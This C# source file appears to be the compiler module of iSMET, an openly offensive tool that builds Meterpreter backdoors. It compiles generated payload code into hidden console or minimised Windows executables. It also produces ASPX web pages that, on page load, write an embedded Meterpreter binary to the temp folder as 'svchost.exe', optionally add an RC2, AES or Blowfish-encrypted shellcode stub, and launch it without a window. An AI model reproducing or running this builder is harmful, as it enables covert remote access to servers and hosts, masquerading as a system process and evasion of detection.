using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;

namespace iSMET.CSharp.Collection
{
    //    ██╗███████╗███╗   ███╗███████╗████████╗    ██╗   ██╗██████╗    ██╗
    //    ██║██╔════╝████╗ ████║██╔════╝╚══██╔══╝    ██║   ██║╚════██╗  ███║
    //    ██║███████╗██╔████╔██║█████╗     ██║       ██║   ██║ █████╔╝  ╚██║
    //    ██║╚════██║██║╚██╔╝██║██╔══╝     ██║       ╚██╗ ██╔╝██╔═══╝    ██║
    //    ██║███████║██║ ╚═╝ ██║███████╗   ██║        ╚████╔╝ ███████╗██╗██║
    //    ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝         ╚═══╝  ╚══════╝╚═╝╚═╝
    // iSMET - (A)Symmetric Meterpreter Encryption Tool v2.1
    // Author: @mindspoof - @PriviaSec
	public class Compiler
    {
		public bool isCreated = false;
		public string nameSpace = string.Empty;
		private static List<string> _netFrameworkList = new List<string>();
		private static List<string> _x64NetFrameworkList = new List<string>();
        /// <summary>
        /// Backdoor Builder Assembly Information
        /// </summary>
		private const string AsmInfo = "using System.Reflection; using System.Threading; using System.Runtime.CompilerServices; using System.Runtime.InteropServices; [assembly: AssemblyTitle(\"iSMET Meterpreter Builder\")] [assembly: AssemblyDescription(\"iSMET Meterpreter Builder\")] [assembly: AssemblyConfiguration(\"\")] [assembly: AssemblyCompany(\"@mindspoof\")] [assembly: AssemblyProduct(\"http://eyupcelik.com.tr\")] [assembly: AssemblyCopyright(\"Copyright ©  2017 @mindspoof\")] [assembly: AssemblyTrademark(\"\")] [assembly: AssemblyCulture(\"\")] [assembly: ComVisible(false)] [assembly: Guid(\"7bfe290e-8784-4277-8de9-eb4a6bcf83cc\")] [assembly: AssemblyVersion(\"2.1.0.0\")] [assembly: AssemblyFileVersion(\"2.1.0.0\")]";
		/// <summary>
		/// iSMET C# Console Application & Console Appliation with Mapped File Builder
		/// </summary>
		/// <param name="random">Random File Name</param>
		/// <param name="fileExt">File Extension</param>
		/// <param name="buildCode">Generated C# Code</param>
		/// <param name="arch">Backdoor Architecture</param>
		public void Console(string random, string fileExt, string buildCode, string arch)
		{
			var csFileName = $"{Directory.GetCurrentDirectory()}\\Saved\\{random}.cs";
			var savedFileName = $"{Directory.GetCurrentDirectory()}\\Saved\\{random}{fileExt}";
			var arguments = string.Empty;
			if (arch == Architecture.x86.ToString())
			{
				NetFrameWorkDirectory();
				var text3 = _netFrameworkList[_netFrameworkList.Count - 1];
				arguments = string.Concat(new string[]
				{
					" /c C:\\Windows\\Microsoft.NET\\Framework\\",
					text3,
					"\\csc.exe /unsafe /platform:",
					arch,
					" /out:\"",
                    savedFileName,
					"\" \"",
                    csFileName,
					"\" \"" + Directory.GetCurrentDirectory() + "\\Saved\\AssemblyInfo.cs\""
				});
			}
			else if (arch == Architecture.x64.ToString())
			{
				X64NetFrameWorkDirectory();
				var text4 = _x64NetFrameworkList[_x64NetFrameworkList.Count - 1];
				arguments = string.Concat(new string[]
				{
					" /c C:\\Windows\\Microsoft.NET\\Framework\\",
					text4,
					"\\csc.exe /unsafe /platform:",
					arch,
					" /out:\"",
                    savedFileName,
					"\" \"",
                    csFileName,
					"\" \"" + Directory.GetCurrentDirectory() + "\\Saved\\AssemblyInfo.cs\""
				});
			}
			File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\AssemblyInfo.cs", AsmInfo);
			File.WriteAllText(csFileName, buildCode);
			BuildRunMeterpreter("C:\\Windows\\System32\\cmd.exe", arguments);
            DeleteCsFileInDirectory();
			GetCreatedFile(savedFileName);
		}
		/// <summary>
		/// iSMET C# Windows Form Application & Windows Form Application with Mapped File Builder
		/// </summary>
		/// <param name="random">Random File Name</param>
		/// <param name="fileName">File Name</param>
		/// <param name="buildCode">Generated C# Code</param>
		/// <param name="arch">Backdoor Architecture</param>
		public void Form(string random, string fileName, string buildCode, string arch)
		{
			var contents = string.Empty;
			var contents2 = string.Empty;
			if (!string.IsNullOrEmpty(nameSpace))
			{
				contents2 = "using System; using System.Collections.Generic; using System.Linq; using System.Windows.Forms; using System.Threading; namespace " + nameSpace + " { static class Program { [STAThread] static void Main() { Application.EnableVisualStyles(); Application.SetCompatibleTextRenderingDefault(false); Application.Run(new Form1()); } } }";
			}
			else
			{
				contents2 = "using System; using System.Collections.Generic; using System.Linq; using System.Windows.Forms; using System.Threading; namespace MeterpreterForm { static class Program { [STAThread] static void Main() { Application.EnableVisualStyles(); Application.SetCompatibleTextRenderingDefault(false); Application.Run(new Form1()); } } }";
			}
			if (!string.IsNullOrEmpty(nameSpace))
			{
				contents = "namespace " + nameSpace + " { partial class Form1 { private System.ComponentModel.IContainer components = null; protected override void Dispose(bool disposing) { if (disposing && (components != null)) { components.Dispose(); } base.Dispose(disposing); } private void InitializeComponent() { this.SuspendLayout(); this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F); this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font; this.ClientSize = new System.Drawing.Size(465, 372); this.Name = \"Form1\"; this.ShowInTaskbar = false; this.Text = \"Form1\"; this.WindowState = System.Windows.Forms.FormWindowState.Minimized; this.Load += new System.EventHandler(this.Form1_Load); this.ResumeLayout(false); } } }";
			}
			else
			{
				contents = "namespace MeterpreterForm { partial class Form1 { private System.ComponentModel.IContainer components = null; protected override void Dispose(bool disposing) { if (disposing && (components != null)) { components.Dispose(); } base.Dispose(disposing); } private void InitializeComponent() { this.SuspendLayout(); this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F); this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font; this.ClientSize = new System.Drawing.Size(465, 372); this.Name = \"Form1\"; this.ShowInTaskbar = false; this.Text = \"Form1\"; this.WindowState = System.Windows.Forms.FormWindowState.Minimized; this.Load += new System.EventHandler(this.Form1_Load); this.ResumeLayout(false); } } }";
			}
			var formCs = $"{Directory.GetCurrentDirectory()}\\Saved\\Form1.cs";
			var formDesignerCs = $"{Directory.GetCurrentDirectory()}\\Saved\\Form1.Designer.cs";
			var programCs = $"{Directory.GetCurrentDirectory()}\\Saved\\Program.cs";
			var savedFileName = $"{Directory.GetCurrentDirectory()}\\Saved\\{random}{fileName}";
			var arguments = string.Empty;
			if (arch == Architecture.x86.ToString())
			{
				NetFrameWorkDirectory();
				var text2 = _netFrameworkList[_netFrameworkList.Count - 1];
				arguments = string.Concat(new string[]
				{
					" /c C:\\Windows\\Microsoft.NET\\Framework\\",
					text2,
					"\\csc.exe /unsafe /target:winexe /platform:",
					arch,
					" /out:\"",
                    savedFileName,
					"\" \"",
					Directory.GetCurrentDirectory(),
					"\\Saved\\*.cs\" \"",
					Directory.GetCurrentDirectory(),
					"\\Saved\\AssemblyInfo.cs\""
				});
			}
			else if (arch == Architecture.x64.ToString())
			{
				X64NetFrameWorkDirectory();
				var text3 = _x64NetFrameworkList[_x64NetFrameworkList.Count - 1];
				arguments = string.Concat(new string[]
				{
					" /c C:\\Windows\\Microsoft.NET\\Framework\\",
					text3,
					"\\csc.exe /unsafe /target:winexe /platform:",
					arch,
					" /out:\"",
                    savedFileName,
					"\" \"",
					Directory.GetCurrentDirectory(),
					"\\Saved\\*.cs\" \"",
					Directory.GetCurrentDirectory(),
					"\\Saved\\AssemblyInfo.cs\""
				});
			}
			File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\AssemblyInfo.cs", AsmInfo);
			File.WriteAllText(formCs, buildCode);
			File.WriteAllText(formDesignerCs, contents);
			File.WriteAllText(programCs, contents2);
			BuildRunMeterpreter("C:\\Windows\\System32\\cmd.exe", arguments);
            DeleteCsFileInDirectory();
			GetCreatedFile(savedFileName);
		}
		/// <summary>
		/// iSMET ASPX-EXE File Builder
		/// </summary>
		/// <param name="random">Random File Name</param>
		/// <param name="fileName">File Name</param>
		/// <param name="buildCode">Generated C# Code</param>
		/// <param name="arch">Backdoor Architecture</param>
		/// <param name="SelectedEncryption">Selected Encryption</param>
		public void Aspx(string random, string fileName, string buildCode, string arch, int SelectedEncryption)
        {
            var csFileName = $"{Directory.GetCurrentDirectory()}\\Saved\\{random}.cs";
            var savedFileName = $"{Directory.GetCurrentDirectory()}\\Saved\\{random}{fileName}";
            var arguments = string.Empty;
            if (arch == Architecture.x86.ToString())
            {
                NetFrameWorkDirectory();
                var text3 = _netFrameworkList[_netFrameworkList.Count - 1];
                arguments = string.Concat(new string[]
                {
                    " /c C:\\Windows\\Microsoft.NET\\Framework\\",
                    text3,
                    "\\csc.exe /unsafe /platform:",
                    arch,
                    " /out:\"",
                    savedFileName,
                    "\" \"",
                    csFileName,
                    "\" \"" + Directory.GetCurrentDirectory() + "\\Saved\\AssemblyInfo.cs\""
                });
            }
            else if (arch == Architecture.x64.ToString())
            {
                X64NetFrameWorkDirectory();
                var text4 = _x64NetFrameworkList[_x64NetFrameworkList.Count - 1];
                arguments = string.Concat(new string[]
                {
                    " /c C:\\Windows\\Microsoft.NET\\Framework\\",
                    text4,
                    "\\csc.exe /unsafe /platform:",
                    arch,
                    " /out:\"",
                    savedFileName,
                    "\" \"",
                    csFileName,
                    "\" \"" + Directory.GetCurrentDirectory() + "\\Saved\\AssemblyInfo.cs\""
                });
            }
            File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\AssemblyInfo.cs", AsmInfo);
            File.WriteAllText(csFileName, buildCode);
            BuildRunMeterpreter("C:\\Windows\\System32\\cmd.exe", arguments);
            DeleteCsFileInDirectory();
            byte[] GetCompiledBinary = File.ReadAllBytes(savedFileName);
            var meterpreterShellArray = GeneralFunction.ByteArrayToString(GetCompiledBinary);
            var shellArrayLength = meterpreterShellArray.Split(',');
			File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\meter.bin", meterpreterShellArray);
            var tempPath = GeneralFunction.RandomFileName(0, 5);
            var pathCombine = GeneralFunction.RandomFileName(0, 6);
            var tempPath2 = GeneralFunction.RandomFileName(0, 11);
            var meterFile = GeneralFunction.RandomFileName(0, 7);
            var shellCode = GeneralFunction.RandomFileName(0, 8);
            var processName = GeneralFunction.RandomFileName(0, 10);
            if (SelectedEncryption == (int)EncryptionType.RcTwo)
            {
				var rndRc2ShellCode = "rc2_"+ GeneralFunction.RandomFileName(0, 4);
				byte[] getRc2File = File.ReadAllBytes(Directory.GetCurrentDirectory() + "\\Saved\\iSMETShellCode.txt");
                var rc2ShellArray = GeneralFunction.ByteArrayToString(getRc2File);
                var rc2shellArrayLength = rc2ShellArray.Split(',');
				var rndPathCombine = "rc2_" + GeneralFunction.RandomFileName(0, 9);
				File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\rc2.bin", rc2ShellArray);
                GeneralFunction.CleanDirectory();
                File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\rc2.bin");
				var rc2stableAspx = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %> <%@ Import Namespace=\"System.IO\" %> <script runat=\"server\"> protected void Page_Load(object sender, EventArgs e) { byte[] " + shellCode + " = new byte[" + shellArrayLength.Length + "] { " + meterpreterShellArray + " }; string " + tempPath + " = Path.GetTempPath(); string " + pathCombine + " = Path.Combine(" + tempPath + ", \"iSMET\"); string " + meterFile + " = Path.Combine(" + pathCombine + ", \"svchost.exe\");  Directory.CreateDirectory(" + pathCombine + ");  FileStream fs = File.Create(" + meterFile + ");  try { fs.Write(" + shellCode + ", 0, " + shellCode + ".Length); } finally { if (fs != null) ((IDisposable)fs).Dispose(); } byte[] "+ rndRc2ShellCode +" = new byte["+ rc2shellArrayLength.Length + "] { "+ rc2ShellArray + " }; string "+ tempPath2+" = Path.Combine(" + tempPath+", \"iSMET\");  string " + rndPathCombine +" = Path.Combine(" + tempPath2 + ", \"iSMETShellCode.txt\"); FileStream fss = File.Create("+ rndPathCombine +"); try { fss.Write(" + rndRc2ShellCode + ", 0, " + rndRc2ShellCode + ".Length); } finally { if (fss != null) ((IDisposable)fss).Dispose(); } System.Diagnostics.Process " + processName + " = new System.Diagnostics.Process(); " + processName + ".StartInfo.CreateNoWindow = true; " + processName + ".StartInfo.UseShellExecute = true; " + processName + ".StartInfo.FileName = " + meterFile + "; " + processName + ".Start(); } </script> ";
                File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\" + shellCode + ".aspx", rc2stableAspx);
                File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\iSMETShellCode.txt");
			}
			else if (SelectedEncryption == (int)EncryptionType.AESCBC)
			{
				var rndAesShellCode = "rc2_" + GeneralFunction.RandomFileName(0, 4);
				byte[] getAesFile = File.ReadAllBytes(Directory.GetCurrentDirectory() + "\\Saved\\Stub.bin");
				var AesShellArray = GeneralFunction.ByteArrayToString(getAesFile);
				var AesShellArrayLength = AesShellArray.Split(',');
				var rndPathCombine = "rc2_" + GeneralFunction.RandomFileName(0, 9);
				File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\rc2.bin", AesShellArray);
				GeneralFunction.CleanDirectory();
				File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\rc2.bin");
				var aesStableAspx = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %> <%@ Import Namespace=\"System.IO\" %> <script runat=\"server\"> protected void Page_Load(object sender, EventArgs e) { byte[] " + shellCode + " = new byte[" + shellArrayLength.Length + "] { " + meterpreterShellArray + " }; string " + tempPath + " = Path.GetTempPath(); string " + pathCombine + " = Path.Combine(" + tempPath + ", \"iSMET\"); string " + meterFile + " = Path.Combine(" + pathCombine + ", \"svchost.exe\");  Directory.CreateDirectory(" + pathCombine + ");  FileStream fs = File.Create(" + meterFile + ");  try { fs.Write(" + shellCode + ", 0, " + shellCode + ".Length); } finally { if (fs != null) ((IDisposable)fs).Dispose(); } byte[] " + rndAesShellCode + " = new byte[" + AesShellArrayLength.Length + "] { " + AesShellArray + " }; string " + tempPath2 + " = Path.Combine(" + tempPath + ", \"iSMET\");  string " + rndPathCombine + " = Path.Combine(" + tempPath2 + ", \"Stub.bin\"); FileStream fss = File.Create(" + rndPathCombine + "); try { fss.Write(" + rndAesShellCode + ", 0, " + rndAesShellCode + ".Length); } finally { if (fss != null) ((IDisposable)fss).Dispose(); } System.Diagnostics.Process " + processName + " = new System.Diagnostics.Process(); " + processName + ".StartInfo.CreateNoWindow = true; " + processName + ".StartInfo.UseShellExecute = true; " + processName + ".StartInfo.FileName = " + meterFile + "; " + processName + ".Start(); } </script> ";
				File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\" + shellCode + ".aspx", aesStableAspx);
				File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\Stub.bin");
			}
			else if (SelectedEncryption == (int)EncryptionType.BlowFish)
			{
				var rndBfishShellCode = "rc2_" + GeneralFunction.RandomFileName(0, 4);
				byte[] getBfishFile = File.ReadAllBytes(Directory.GetCurrentDirectory() + "\\Saved\\Stub.bin");
				var BfishShellArray = GeneralFunction.ByteArrayToString(getBfishFile);
				var BfishShellArrayLength = BfishShellArray.Split(',');
				var rndPathCombine = "rc2_" + GeneralFunction.RandomFileName(0, 9);
				File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\rc2.bin", BfishShellArray);
				GeneralFunction.CleanDirectory();
				File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\rc2.bin");
				var bfishStableAspx = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %> <%@ Import Namespace=\"System.IO\" %> <script runat=\"server\"> protected void Page_Load(object sender, EventArgs e) { byte[] " + shellCode + " = new byte[" + shellArrayLength.Length + "] { " + meterpreterShellArray + " }; string " + tempPath + " = Path.GetTempPath(); string " + pathCombine + " = Path.Combine(" + tempPath + ", \"iSMET\"); string " + meterFile + " = Path.Combine(" + pathCombine + ", \"svchost.exe\");  Directory.CreateDirectory(" + pathCombine + ");  FileStream fs = File.Create(" + meterFile + ");  try { fs.Write(" + shellCode + ", 0, " + shellCode + ".Length); } finally { if (fs != null) ((IDisposable)fs).Dispose(); } byte[] " + rndBfishShellCode + " = new byte[" + BfishShellArrayLength.Length + "] { " + BfishShellArray + " }; string " + tempPath2 + " = Path.Combine(" + tempPath + ", \"iSMET\");  string " + rndPathCombine + " = Path.Combine(" + tempPath2 + ", \"Stub.bin\"); FileStream fss = File.Create(" + rndPathCombine + "); try { fss.Write(" + rndBfishShellCode + ", 0, " + rndBfishShellCode + ".Length); } finally { if (fss != null) ((IDisposable)fss).Dispose(); } System.Diagnostics.Process " + processName + " = new System.Diagnostics.Process(); " + processName + ".StartInfo.CreateNoWindow = true; " + processName + ".StartInfo.UseShellExecute = true; " + processName + ".StartInfo.FileName = " + meterFile + "; " + processName + ".Start(); } </script> ";
				File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\" + shellCode + ".aspx", bfishStableAspx);
				File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\Stub.bin");
			}
			else
			{
				var stableAspx = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %> <%@ Import Namespace=\"System.IO\" %> <script runat=\"server\"> protected void Page_Load(object sender, EventArgs e) { byte[] " + shellCode + " = new byte[" + shellArrayLength.Length + "] { " + meterpreterShellArray + " }; string " + tempPath + " = Path.GetTempPath(); string " + pathCombine + " = Path.Combine(" + tempPath + ", \"iSMET\"); string " + meterFile + " = Path.Combine(" + pathCombine + ", \"svchost.exe\");  Directory.CreateDirectory(" + pathCombine + ");  FileStream fs = File.Create(" + meterFile + ");  try { fs.Write(" + shellCode + ", 0, " + shellCode + ".Length); } finally { if (fs != null) ((IDisposable)fs).Dispose(); } System.Diagnostics.Process " + processName + " = new System.Diagnostics.Process(); " + processName + ".StartInfo.CreateNoWindow = true; " + processName + ".StartInfo.UseShellExecute = true; " + processName + ".StartInfo.FileName = " + meterFile + "; " + processName + ".Start(); } </script> ";
                File.WriteAllText($"{Directory.GetCurrentDirectory()}\\Saved\\" + shellCode + ".aspx", stableAspx);
			}
			File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\meter.bin");
            File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\" + random + fileName);
			GetCreatedFile(savedFileName);
        }
		/// <summary>
		/// iSMET PowerShell File Builder
		/// </summary>
		/// <param name="random">Random File Name</param>
		/// <param name="fileName">File Name</param>
		/// <param name="buildCode">Generated C# Code</param>
		public void PowerShell(string random, string fileName, string buildCode)
		{
			var text = $"{Directory.GetCurrentDirectory()}\\{random}.ps1";
			File.WriteAllText(text, buildCode);
			GetCreatedFile(text);
		}
		/// <summary>
		/// iSMET Backdoor Builder Process Method
		/// </summary>
		/// <param name="filename">Random File Name</param>
		/// <param name="arguments">CSC.exe Builder Arguments</param>
		private static void BuildRunMeterpreter(string filename, string arguments)
		{
			var process = new Process { StartInfo = { FileName = filename } };
			if (!string.IsNullOrEmpty(arguments))
			{
				process.StartInfo.Arguments = arguments;
			}
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			var stdOutput = new StringBuilder();
			process.OutputDataReceived += delegate (object sender, DataReceivedEventArgs args)
			{
				stdOutput.AppendLine(args.Data);
			};
			string value = null;
			try
			{
				process.Start();
				process.BeginOutputReadLine();
				value = process.StandardError.ReadToEnd();
				process.WaitForExit();
			}
			catch (Exception)
			{

			}
			bool flag2 = process.ExitCode == 0;
			if (!flag2)
			{
				var stringBuilder = new StringBuilder();
				if (!string.IsNullOrEmpty(value))
				{
					stringBuilder.AppendLine(value);
				}
				if (stdOutput.Length != 0)
				{
					stringBuilder.AppendLine("Std output:");
					stringBuilder.AppendLine(stdOutput.ToString());
				}
			}
		}
        /// <summary>
        /// Get Installed x86 .NET Framework Directory
        /// </summary>
		private static void NetFrameWorkDirectory()
		{
			_netFrameworkList.Clear();
			const string path = "C:\\Windows\\Microsoft.NET\\Framework";
			var directories = Directory.GetDirectories(path);
			foreach (var t in directories)
            {
                var array = t.Split('\\');
				if (array[array.Length - 1].StartsWith("v"))
				{
					if (array[array.Length - 1].StartsWith("VJ"))
					{
						break;
					}
					_netFrameworkList.Add(array[array.Length - 1]);
				}
			}
		}
        /// <summary>
        /// Get Installed x64 .NET Framework Directory
        /// </summary>
		private static void X64NetFrameWorkDirectory()
		{
			_x64NetFrameworkList.Clear();
			const string path = "C:\\Windows\\Microsoft.NET\\Framework64";
			var directories = Directory.GetDirectories(path);
			foreach (var t in directories)
			{
				var array = t.Split(new char[]
				{
					'\\'
				});
				if (array[array.Length - 1].StartsWith("v"))
				{
					if (array[array.Length - 1].StartsWith("VJ"))
					{
						break;
					}
					_x64NetFrameworkList.Add(array[array.Length - 1]);
				}
			}
		}
        /// <summary>
        /// Clean *.cs Code in Directory
        /// </summary>
		private static void DeleteCsFileInDirectory()
		{
            var directoryInfo = new DirectoryInfo(Directory.GetCurrentDirectory() + "\\Saved\\");
            var files = directoryInfo.GetFiles("*.cs");
            var array = files;
            foreach (var fileInfo in array)
            {
                File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\{fileInfo.Name}");
            }
            var files2 = directoryInfo.GetFiles("*.csproj");
            var array2 = files2;
            foreach (var fileInfo2 in array2)
            {
                File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\{fileInfo2.Name}");
            }
            var files3 = directoryInfo.GetFiles("*.json");
            var array3 = files3;
            foreach (var fileInfo3 in array3)
            {
                File.Delete($"{Directory.GetCurrentDirectory()}\\Saved\\{fileInfo3.Name}");
            }
        }
        /// <summary>
        /// File Create Control
        /// </summary>
		private void GetCreatedFile(string directory)
		{
			try
			{
				if (File.Exists(directory))
				{
					isCreated = true;
				}
				else
				{
					isCreated = false;
				}
			}
			catch (Exception ex)
			{
                System.Console.WriteLine($"An error occurred: {ex.Message}", @"iSMET Error!");
			}
		}
	}
}
